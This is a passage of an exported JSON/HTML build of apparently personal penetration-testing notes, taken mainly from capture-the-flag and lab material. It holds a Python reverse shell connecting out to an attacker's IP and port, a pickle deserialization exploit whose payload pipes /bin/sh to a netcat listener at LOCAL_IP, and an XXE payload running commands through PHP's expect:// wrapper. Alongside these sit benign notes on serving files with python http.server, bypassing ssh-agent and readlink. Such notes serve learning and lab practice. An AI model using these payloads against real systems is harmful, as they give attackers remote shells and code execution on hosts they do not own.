style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;attacker_port &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1234&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;AF_INET&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;((&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dup2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fileno&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(),&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dup2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fileno&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(),&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dup2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fileno&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(),&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;subprocess&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;call&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;([&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Catch it with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;exploiting-python-pickles&quot;&gt;Exploiting Python pickles&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#exploiting-python-pickles&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;One way to attack Python webapps is to exploit &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;pickles&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, and in particular the &lt;code&gt;pickle.loads()&lt;/code&gt; operation which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like &lt;code&gt;object.__reduce__()&lt;/code&gt; are run.&lt;/p&gt;\n&lt;p&gt;For example, the &lt;a href=&quot;https://tryhackme.com/room/owasptop10&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;TryHackMe’s OWASP Top 10&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; room has us use &lt;a href=&quot;https://davidhamann.de/2020/04/05/exploiting-python-pickle/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the following code&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to create a malicious base64 encoded object to feed &lt;code&gt;pickle.loads()&lt;/code&gt; (&lt;code&gt;LOCAL_IP&lt;/code&gt; gets replaced by your machine’s IP):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; pickle\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; sys\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; base64\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;command &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;#x26;1 | nc LOCAL_IP 4444 &gt; /tmp/f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; rce&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;    def&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; __reduce__&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;self&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; os\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;        return&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;command&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;print&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;base64&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;b64encode&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;pickle&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dumps&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;rce&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;())))&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;What’s getting encoded here is the &lt;code&gt;rce&lt;/code&gt; class. Python will call &lt;code&gt;rce.__reduce__()&lt;/code&gt; to determine how to initialize this class when &lt;code&gt;pickle.loads()&lt;/code&gt; deserializes it, and &lt;code&gt;__reduce__()&lt;/code&gt; will return the tuple &lt;code&gt;(os.system, (command,))&lt;/code&gt;, where &lt;code&gt;command&lt;/code&gt; is basically our standard Metasploit reverse shell. Python then initializes the class by using &lt;code&gt;os.system&lt;/code&gt; to call &lt;code&gt;command&lt;/code&gt;, and there’s our reverse shell!&lt;/p&gt;"},"spells/Quick-n-dirty-Python-web-server":{"slug":"spells/Quick-n-dirty-Python-web-server","filePath":"spells/Quick-n-dirty Python web server.md","title":"Quick-n-dirty Python web server","links":[],"tags":["Language/Python","Protocol/HTTP","AttackCycle/Exfiltration","AttackCycle/Exploitation"],"content":"Python 3 can nativly serve files out of the current directory over HTTP.\npython3 -m http.server $PORT\nThe default $PORT is 8080.\nSome useful http.server flags:\n\n--bind ADDRESS, -b ADDRESS\nSpecify alternate bind address [default: all interfaces]\n--directory DIRECTORY, -d DIRECTORY\nSpecify alternative directory [default: current directory]\n","richContent":"&lt;p&gt;&lt;a href=&quot;https://spoofing.medium.com/how-to-make-a-simple-http-server-using-python-ea35f0b741a4&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Python 3 can nativly serve files out of the current directory over HTTP.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http.server&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The default &lt;code&gt;$PORT&lt;/code&gt; is 8080.&lt;/p&gt;\n&lt;p&gt;Some useful &lt;code&gt;http.server&lt;/code&gt; flags:&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;code&gt;--bind ADDRESS&lt;/code&gt;, &lt;code&gt;-b ADDRESS&lt;/code&gt;&lt;br&gt;\nSpecify alternate bind address [default: all interfaces]&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;--directory DIRECTORY&lt;/code&gt;, &lt;code&gt;-d DIRECTORY&lt;/code&gt;&lt;br&gt;\nSpecify alternative directory [default: current directory]&lt;/p&gt;\n&lt;/blockquote&gt;"},"spells/Quickly-bypass-ssh-agent":{"slug":"spells/Quickly-bypass-ssh-agent","filePath":"spells/Quickly bypass ssh-agent.md","title":"Quickly bypass ssh-agent","links":[],"tags":["HowTo","Application/SSH"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_CTF.txt.\n\n\n\nenv -u SSH_AUTH_SOCK ssh -i $KEY_FILE ${USER}@${HOST}","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_CTF.txt#L24&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_CTF.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; SSH_AUTH_SOCK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEY_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Quickly-find-the-canonical-path-of-a-file":{"slug":"spells/Quickly-find-the-canonical-path-of-a-file","filePath":"spells/Quickly find the canonical path of a file.md","title":"Quickly find the canonical path of a file","links":["spells/man"],"tags":["HowTo","OS/Linux/Distros/Debian","Application/readlink"],"content":"On Debian-based systems and derivatives, use readlink.\nSome useful options from the man page:\n\n-f, --canonicalize\ncanonicalize by following every symlink in every component of the given name recursively; all but the last component must exist\n-e, --canonicalize-existing\ncanonicalize by following every symlink in every component of the given name recursively, all components must exist\n-m, --canonicalize-missing\ncanonicalize by following every symlink in every component of the given name recursively, without requirements on components existence\n\nNote that this follows symlinks, so it’s not suitable for every use.","richContent":"&lt;p&gt;On Debian-based systems and derivatives, use readlink.&lt;/p&gt;\n&lt;p&gt;Some useful options from the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/man&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/man&quot;&gt;man&lt;/a&gt; page:&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;code&gt;-f&lt;/code&gt;, &lt;code&gt;--canonicalize&lt;/code&gt;&lt;br&gt;\ncanonicalize by following every symlink in every component of the given name recursively; all but the last component must exist&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-e&lt;/code&gt;, &lt;code&gt;--canonicalize-existing&lt;/code&gt;&lt;br&gt;\ncanonicalize by following every symlink in every component of the given name recursively, all components must exist&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-m&lt;/code&gt;, &lt;code&gt;--canonicalize-missing&lt;/code&gt;&lt;br&gt;\ncanonicalize by following every symlink in every component of the given name recursively, without requirements on components existence&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Note that this follows symlinks, so it’s not suitable for every use.&lt;/p&gt;"},"spells/RCE-via-XXE-in-PHP":{"slug":"spells/RCE-via-XXE-in-PHP","filePath":"spells/RCE via XXE in PHP.md","title":"RCE via XXE in PHP","links":["spells/PHP","spells/XXE-attacks"],"tags":["AttackCycle/Exploitation/XXE","Language/PHP","FileFormat/XML"],"content":"If you’re dealing with PHP, and if the PHP expect module is loaded, and if XML inputs aren’t properly sanitized, then defining a SYSTEM entity with the value of expect://$COMMAND will get you RCE via XXE.\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE root [&lt;!ENTITY xxerce SYSTEM &quot;expect://id&quot;&gt;]&gt;\n&lt;root&gt;&amp;xxerce;&lt;/root&gt;\nDon’t expect to run into this often however, as this combination of factors is pretty rare.","richContent":"&lt;p&gt;&lt;em&gt;If&lt;/em&gt; you’re dealing with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;, and &lt;em&gt;if&lt;/em&gt; the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; expect module is loaded, and &lt;em&gt;if&lt;/em&gt; XML inputs aren’t properly sanitized, then &lt;a href=&quot;https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;defining a SYSTEM entity with the value of &lt;code&gt;expect://$COMMAND&lt;/code&gt; will get you RCE&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 